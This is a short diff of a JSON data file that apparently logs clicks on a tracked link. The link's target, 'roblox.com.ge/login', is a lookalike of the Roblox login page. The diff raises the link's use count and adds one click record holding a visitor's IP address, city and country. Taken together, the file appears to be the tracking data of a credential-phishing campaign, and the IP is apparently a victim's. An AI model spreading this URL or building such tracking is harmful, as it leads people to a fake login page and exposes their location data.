@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1099,
+    "useCount": 1100,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8936,6 +8936,14 @@
         "city": "San Juan",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777261262814,
+        "ip": "45.161.24.51",
+        "country": "El Salvador",
+        "city": "San Salvador",
+        "flag": "🇸🇻",
+        "countryCode": "SV"
       }
     ]
   },
